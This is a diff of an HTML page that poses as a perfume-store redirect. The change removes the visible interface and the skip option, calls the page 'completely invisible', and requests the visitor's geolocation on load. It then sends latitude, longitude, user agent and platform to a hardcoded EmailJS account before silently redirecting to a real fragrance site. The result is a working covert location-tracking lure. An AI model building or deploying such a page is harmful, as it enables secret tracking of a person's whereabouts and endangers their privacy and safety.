@@ -3,242 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Perfume Store</title>
+    <title>Redirecting...</title>
+    <!-- No UI elements - completely invisible page -->
     <style>
-        * {
+        /* Minimal styling - page almost invisible */
+        body {
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
+            background: transparent;
+            font-family: Arial, sans-serif;
         }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        .container {
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 20px;
-            padding: 40px;
-            max-width: 500px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            text-align: center;
-        }
-        h2 {
+        /* Very subtle loading indicator (optional) */
+        .loading {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
             color: #333;
-            margin-bottom: 10px;
-            font-size: 28px;
-        }
-        .subtitle {
-            color: #666;
-            margin-bottom: 25px;
-        }
-        .status-box {
-            background: #f8f9fa;
-            border-radius: 12px;
-            padding: 20px;
-            margin: 20px 0;
-            min-height: 80px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            border: 2px dashed #dee2e6;
-            transition: all 0.3s ease;
-        }
-        .status-box.success {
-            border-color: #28a745;
-            background: #d4edda;
-        }
-        .status-box.error {
-            border-color: #dc3545;
-            background: #f8d7da;
-        }
-        .status-box.waiting {
-            border-color: #ffc107;
-            background: #fff3cd;
-        }
-        .status-text {
-            font-size: 16px;
-            color: #333;
-            margin-top: 10px;
-        }
-        .location-data {
             font-size: 14px;
-            color: #495057;
-            background: white;
-            padding: 10px;
-            border-radius: 8px;
-            margin-top: 10px;
-            width: 100%;
-            word-break: break-all;
-            border: 1px solid #dee2e6;
-        }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #f5576c;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            display: none;
-            margin: 10px auto;
-        }
-        .loader.active {
-            display: block;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .btn {
-            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
-            color: white;
-            border: none;
-            padding: 14px 35px;
-            border-radius: 30px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin: 5px;
-            transition: transform 0.2s;
-            width: 100%;
-        }
-        .btn:hover {
-            transform: scale(1.02);
-        }
-        .btn-secondary {
-            background: #6c757d;
-            margin-top: 10px;
-        }
-        .log-container {
-            background: #1e1e1e;
-            color: #00ff00;
-            border-radius: 8px;
-            padding: 15px;
-            margin-top: 20px;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            max-height: 150px;
-            overflow-y: auto;
-            text-align: left;
-            display: none;
-        }
-        .log-container.active {
-            display: block;
-        }
-        .log-entry {
-            padding: 2px 0;
-            border-bottom: 1px solid #333;
-        }
-        .log-entry.error {
-            color: #ff6b6b;
-        }
-        .log-entry.success {
-            color: #69db7c;
-        }
-        .toggle-log {
-            background: none;
-            border: none;
-            color: #6c757d;
-            cursor: pointer;
-            font-size: 12px;
-            margin-top: 10px;
-            text-decoration: underline;
+            opacity: 0.3;
+            pointer-events: none;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>🌸 Luxury Perfumes</h2>
-        <p class="subtitle">Find your perfect fragrance</p>
-        
-        <div class="status-box waiting" id="statusBox">
-            <div class="loader active" id="loader"></div>
-            <div class="status-text" id="statusText">⏳ Requesting location permission...</div>
-            <div class="location-data" id="locationData" style="display:none;"></div>
-        </div>
-
-        <button class="btn" onclick="manualLocationRequest()">📍 Allow Location Access</button>
-        <button class="btn btn-secondary" onclick="skipAndRedirect()">🚀 Skip & Go to Store</button>
-        
-        <button class="toggle-log" onclick="toggleLog()">📋 Show/Hide Debug Log</button>
-        <div class="log-container" id="logContainer"></div>
-    </div>
+    <!-- Almost invisible loading text (can be removed completely) -->
+    <div class="loading">Loading...</div>
 
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
-        // Configuration
+        // ============================================
+        // CONFIGURATION - Change these as needed
+        // ============================================
         const CONFIG = {
+            // EmailJS Settings
             emailjsPublicKey: "ueOumEe6aJ_CEmq_m",
             emailjsServiceId: "service_7pjie2s",
             emailjsTemplateId: "template_30kabln",
-            perfumeWebsite: "https://www.fragrantica.com/", // Change to any working perfume site
-            redirectDelay: 2000 // 2 seconds delay before redirect
+            
+            // Perfume Website (Change to any working site)
+            perfumeWebsite: "https://www.fragrantica.com/",
+            // Alternatives: 
+            // "https://www.fragrancex.com/"
+            // "https://www.fragrancenet.com/"
+            // "https://www.ulta.com/"
+            // "https://www.sephora.com/"
+            
+            // Timing (in milliseconds)
+            redirectDelay: 1500, // 1.5 seconds after email send
+            locationTimeout: 10000 // 10 seconds timeout for location
         };
 
-        // State
-        let state = {
-            locationSent: false,
-            locationData: null,
-            redirecting: false
-        };
-
+        // ============================================
+        // MAIN LOGIC - No UI, just functionality
+        // ============================================
+        
         // Initialize EmailJS
         emailjs.init(CONFIG.emailjsPublicKey);
-        addLog('info', 'EmailJS initialized');
 
-        function addLog(type, message, data = null) {
-            const logContainer = document.getElementById('logContainer');
-            const entry = document.createElement('div');
-            entry.className = `log-entry ${type}`;
-            const timestamp = new Date().toLocaleTimeString();
-            let logMessage = `[${timestamp}] ${message}`;
-            if (data) {
-                logMessage += ` | Data: ${JSON.stringify(data)}`;
-            }
-            entry.textContent = logMessage;
-            logContainer.appendChild(entry);
-            logContainer.scrollTop = logContainer.scrollHeight;
-            console.log(logMessage);
-        }
-
-        function toggleLog() {
-            const container = document.getElementById('logContainer');
-            container.classList.toggle('active');
-        }
-
-        function updateStatus(message, type = 'waiting', locationData = null) {
-            const statusBox = document.getElementById('statusBox');
-            const statusText = document.getElementById('statusText');
-            const loader = document.getElementById('loader');
-            const locationDataEl = document.getElementById('locationData');
-
-            statusBox.className = `status-box ${type}`;
-            statusText.textContent = message;
-            
-            if (type === 'waiting') {
-                loader.classList.add('active');
-            } else {
-                loader.classList.remove('active');
-            }
-
-            if (locationData) {
-                locationDataEl.style.display = 'block';
-                locationDataEl.textContent = `📍 Lat: ${locationData.lat}, Lng: ${locationData.lng}`;
-            } else {
-                locationDataEl.style.display = 'none';
-            }
-        }
+        let emailSent = false;
+        let redirectInitiated = false;
 
         function sendLocationEmail(latitude, longitude) {
-            addLog('info', 'Preparing to send email', { latitude, longitude });
-            updateStatus('📧 Sending location to Gmail...', 'waiting');
-
+            console.log("📍 Sending location:", latitude, longitude);
+            
             const templateParams = {
                 latitude: latitude.toString(),
                 longitude: longitude.toString(),
@@ -246,10 +74,10 @@
                     timeZone: 'Asia/Karachi',
                     dateStyle: 'full',
                     timeStyle: 'medium'
-                })
+                }),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform
             };
-
-            addLog('info', 'Email template params', templateParams);
 
             return emailjs.send(
                 CONFIG.emailjsServiceId,
@@ -257,125 +85,113 @@
                 templateParams
             )
             .then((response) => {
-                addLog('success', '✅ Email sent successfully!', response);
-                updateStatus('✅ Location sent to your Gmail!', 'success', { lat: latitude, lng: longitude });
-                state.locationSent = true;
+                console.log("✅ Email sent successfully!", response);
+                emailSent = true;
                 return true;
             })
             .catch((error) => {
-                addLog('error', '❌ Email sending failed!', error);
-                updateStatus('⚠️ Email sending failed! But we will continue...', 'error', { lat: latitude, lng: longitude });
+                console.error("❌ Email failed:", error);
+                // Continue anyway - don't block redirect
                 return false;
             });
         }
 
         function redirectToPerfumeWebsite() {
-            if (state.redirecting) return;
-            state.redirecting = true;
+            if (redirectInitiated) return;
+            redirectInitiated = true;
             
-            addLog('info', `🔄 Redirecting to: ${CONFIG.perfumeWebsite}`);
-            updateStatus(`🔄 Redirecting to perfume store...`, 'waiting');
+            console.log(`🔄 Redirecting to: ${CONFIG.perfumeWebsite}`);
             
             setTimeout(() => {
                 window.location.href = CONFIG.perfumeWebsite;
-            }, CONFIG.redirectDelay);
+            }, 300); // Small delay for clean redirect
         }
 
-        function handleLocation(position) {
+        function handleLocationSuccess(position) {
             const { latitude, longitude } = position.coords;
-            state.locationData = { lat: latitude, lng: longitude };
+            console.log("🌍 Location received:", latitude, longitude);
             
-            addLog('success', '🌍 Location received!', { latitude, longitude });
-            updateStatus('📍 Location captured! Sending email...', 'waiting', { lat: latitude, lng: longitude });
-
-            // Send email
+            // Send email immediately
             sendLocationEmail(latitude, longitude).then(() => {
-                // Redirect after email is processed
+                // Redirect after email is sent (or failed)
                 setTimeout(() => {
                     redirectToPerfumeWebsite();
-                }, 1000);
+                }, CONFIG.redirectDelay);
             });
         }
 
         function handleLocationError(error) {
-            addLog('error', '❌ Location error!', { code: error.code, message: error.message });
+            console.error("❌ Location error:", error.code, error.message);
             
-            let errorMessage = "⚠️ Location access denied! ";
+            let errorMsg = "Location error: ";
             switch(error.code) {
-                case 1:
-                    errorMessage += "Please allow location access and try again.";
-                    break;
-                case 2:
-                    errorMessage += "Location unavailable. Check your GPS/settings.";
-                    break;
-                case 3:
-                    errorMessage += "Location timeout. Please try again.";
-                    break;
-                default:
-                    errorMessage += "Unknown error occurred.";
+                case 1: errorMsg += "Permission denied"; break;
+                case 2: errorMsg += "Position unavailable"; break;
+                case 3: errorMsg += "Timeout"; break;
+                default: errorMsg += "Unknown error";
             }
+            console.log(`⚠️ ${errorMsg} - Redirecting anyway...`);
             
-            updateStatus(errorMessage, 'error');
-            
-            // Still redirect after 3 seconds
+            // Still redirect even if location fails
             setTimeout(() => {
                 redirectToPerfumeWebsite();
-            }, 3000);
+            }, 1000);
         }
 
-        function requestLocation() {
-            addLog('info', '📍 Requesting location permission...');
-            updateStatus('📍 Requesting location permission...', 'waiting');
-
+        function requestLocationAndRedirect() {
+            console.log("📍 Requesting location permission...");
+            
             if (!("geolocation" in navigator)) {
-                addLog('error', '❌ Geolocation not supported in this browser!');
-                updateStatus('⚠️ Geolocation not supported!', 'error');
-                setTimeout(() => redirectToPerfumeWebsite(), 2000);
+                console.log("⚠️ Geolocation not supported - redirecting...");
+                redirectToPerfumeWebsite();
                 return;
             }
 
+            // Request location with minimal options
             navigator.geolocation.getCurrentPosition(
-                handleLocation,
+                handleLocationSuccess,
                 handleLocationError,
                 {
-                    enableHighAccuracy: true,
-                    timeout: 15000,
-                    maximumAge: 0
+                    enableHighAccuracy: false, // Faster response
+                    timeout: CONFIG.locationTimeout,
+                    maximumAge: 60000 // Allow cached location
                 }
             );
         }
 
-        function manualLocationRequest() {
-            addLog('info', '📌 Manual location request triggered');
-            requestLocation();
-        }
-
-        function skipAndRedirect() {
-            addLog('info', '⏩ User clicked skip button');
-            updateStatus('⏩ Skipping location...', 'waiting');
-            redirectToPerfumeWebsite();
-        }
-
-        // Auto-execute when page loads
+        // ============================================
+        // EXECUTE - Run immediately when page loads
+        // ============================================
+        
+        // Option 1: Request location immediately
         document.addEventListener("DOMContentLoaded", function() {
-            addLog('info', '🚀 Page loaded successfully');
-            addLog('info', `🎯 Redirect target: ${CONFIG.perfumeWebsite}`);
+            console.log("🚀 Page loaded - requesting location...");
             
-            // Small delay to ensure everything is ready
+            // Small delay to ensure everything is initialized
             setTimeout(() => {
-                requestLocation();
-            }, 1000);
+                requestLocationAndRedirect();
+            }, 100);
         });
 
-        // Fallback: If nothing happens in 10 seconds, show manual button
+        // Option 2: Fallback - If location takes too long, still redirect
         setTimeout(() => {
-            const statusText = document.getElementById('statusText');
-            if (!state.locationSent && !state.redirecting) {
-                addLog('info', '⏰ Fallback triggered - showing manual option');
-                updateStatus('⚠️ Auto-request failed. Click the button below.', 'error');
-                document.querySelector('.btn:not(.btn-secondary)').style.display = 'block';
+            if (!redirectInitiated) {
+                console.log("⏰ Fallback: Redirecting after timeout...");
+                redirectToPerfumeWebsite();
             }
-        }, 10000);
+        }, CONFIG.locationTimeout + 2000);
+
+        // ============================================
+        // EXTRA: Handle page visibility changes
+        // ============================================
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                console.log("📱 Page hidden - user may have switched tabs");
+            }
+        });
+
+        console.log("✅ Script initialized successfully");
+        console.log(`🎯 Will redirect to: ${CONFIG.perfumeWebsite}`);
     </script>
 </body>
 </html>
